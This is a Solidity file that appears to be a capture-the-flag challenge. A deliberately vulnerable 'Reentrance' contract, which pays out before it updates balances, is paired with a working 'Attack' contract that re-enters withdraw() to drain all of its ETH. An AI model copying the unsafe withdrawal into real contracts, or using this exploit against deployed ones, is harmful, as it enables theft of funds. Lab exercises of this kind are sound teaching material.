// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract Reentrance {
    mapping(address => uint256) public balances;

    constructor() payable {} // transfer 0.001 ETH when deploy

    function donate(address _to) public payable {
        balances[_to] = balances[_to] + msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    function isSolved() public view returns (bool) {
        return (address(this).balance == 0);
    }

    receive() external payable {}
}

contract Attack {
    Reentrance public reentrance;

    event ReentranceTriggered(uint256 amount);

    constructor(address payable _reentrance) {
        reentrance = Reentrance(_reentrance);
    }

    function startAttack() public {
        uint256 amount = reentrance.balanceOf(address(this));
        reentrance.withdraw(amount);
    }

    receive() external payable {
        uint256 target_balance = address(reentrance).balance;
        uint256 my_balance = reentrance.balanceOf(address(this));
        uint256 amount = target_balance < my_balance ? target_balance : my_balance;

        emit ReentranceTriggered(amount);

        if (amount > 0) {
            reentrance.withdraw(amount);
        }
    }
}


